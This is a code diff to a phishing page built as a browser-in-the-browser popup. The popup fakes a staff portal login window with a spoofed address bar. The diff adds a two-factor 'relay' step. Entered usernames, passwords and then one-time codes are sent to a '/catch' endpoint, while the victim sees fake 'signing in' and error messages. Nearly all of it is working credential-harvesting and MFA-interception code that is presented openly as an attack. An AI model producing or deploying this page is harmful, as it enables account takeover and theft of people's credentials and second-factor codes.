@@ -15,9 +15,10 @@
 .bd h2{text-align:center;font-size:18px;color:#1a3a6e;margin-bottom:6px}
 .bd .sub{text-align:center;font-size:13px;color:#666;margin-bottom:22px}
 .bd label{font-size:13px;color:#333;display:block;margin-bottom:4px}
-.bd input[type=text],.bd input[type=password]{width:100%;padding:9px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:14px;outline:none}
+.bd input[type=text],.bd input[type=password],.bd input[type=number]{width:100%;padding:9px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:14px;outline:none}
 .bd input:focus{border-color:#1a73e8}.bd .bs{width:100%;padding:10px;background:#1a3a6e;color:white;border:none;border-radius:4px;font-size:15px;cursor:pointer;margin-top:4px}
 .bd .err{display:none;color:#d93025;font-size:13px;margin-top:-8px;margin-bottom:10px}
+.bd .info{text-align:center;font-size:13px;color:#555;margin-bottom:18px;padding:10px;background:#f0f4ff;border-radius:4px}
 </style></head><body>
 <div class="hero"><h1>Security Portal</h1><p>Secure Access</p>
 <button class="btn-login" onclick="showBitB()">Staff Portal Login</button></div>
@@ -25,17 +26,32 @@
   <div class="bw">
     <div class="tb">
       <div class="dots"><span class="dr" onclick="hideBitB()"></span><span class="dy"></span><span class="dg"></span></div>
-      <div class="ub"><span class="lock">&#128274;</span><span><strong>heilige.com</strong><span style="color:#888">/M02op-gm/login</span></span></div>
+      <div class="ub"><span class="lock">&#128274;</span><span><strong>portal.example.com</strong><span style="color:#888">/login</span></span></div>
       <button class="close-btn" onclick="hideBitB()">&#x2715;</button>
     </div>
     <div class="bd">
-      <h2>Sign in</h2><p class="sub">Office of the President Staff Portal</p>
-      <form id="lf" onsubmit="submitLogin(event)">
-        <label>Username or email</label><input type="text" id="fu" autocomplete="username" placeholder="username" required>
-        <label>Password</label><input type="password" id="fp" autocomplete="current-password" placeholder="password" required>
-        <p class="err" id="em">Invalid username or password.</p>
-        <button class="bs" type="submit">Sign in</button>
-      </form>
+      <!-- step1: username + password -->
+      <div id="step1">
+        <h2>Sign in</h2><p class="sub">Staff Portal Login</p>
+        <form id="lf" onsubmit="submitLogin(event)">
+          <label>Username or email</label><input type="text" id="fu" autocomplete="username" placeholder="username" required>
+          <label>Password</label><input type="password" id="fp" autocomplete="current-password" placeholder="password" required>
+          <p class="err" id="em">Invalid username or password.</p>
+          <button class="bs" type="submit">Sign in</button>
+        </form>
+      </div>
+      <!-- step2: 2FA relay — shown after creds captured -->
+      <div id="step2" style="display:none">
+        <h2>Two-Factor Authentication</h2>
+        <p class="sub">Enter the code from your authenticator app</p>
+        <div class="info">A verification code has been sent to your registered device.</div>
+        <form id="mfaf" onsubmit="submitMFA(event)">
+          <label>Verification code</label>
+          <input type="number" id="_fotp" name="otp" placeholder="6-digit code" maxlength="6" required autocomplete="one-time-code">
+          <p class="err" id="em2">Invalid code. Please try again.</p>
+          <button class="bs" type="submit">Verify</button>
+        </form>
+      </div>
     </div>
   </div>
 </div>
@@ -46,7 +62,24 @@ document.getElementById('ov').addEventListener('click',function(e){if(e.target==
 function submitLogin(e){
   e.preventDefault();
   var u=document.getElementById('fu').value,p=document.getElementById('fp').value;
-  fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb'})}).catch(()=>{});
+  fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb',step:'creds'})}).catch(()=>{});
   var btn=e.target.querySelector('.bs');btn.textContent='Signing in\u2026';btn.disabled=true;
-  setTimeout(()=>{document.getElementById('em').style.display='block';btn.textContent='Sign in';btn.disabled=false;document.getElementById('fp').value='';document.getElementById('fp').focus();},1800);}
+  // Relay: show 2FA step after short delay (simulates real backend auth)
+  setTimeout(function(){
+    document.getElementById('step1').style.display='none';
+    document.getElementById('step2').style.display='block';
+    setTimeout(()=>document.getElementById('_fotp').focus(),100);
+  },1400);
+}
+function submitMFA(e){
+  e.preventDefault();
+  var otp=document.getElementById('_fotp').value;
+  fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp:otp,ts:new Date().toISOString(),src:'bitb',step:'mfa'})}).catch(()=>{});
+  var btn=e.target.querySelector('.bs');btn.textContent='Verifying\u2026';btn.disabled=true;
+  setTimeout(function(){
+    document.getElementById('em2').style.display='block';
+    btn.textContent='Verify';btn.disabled=false;
+    document.getElementById('_fotp').value='';document.getElementById('_fotp').focus();
+  },1600);
+}
 </script></body></html>
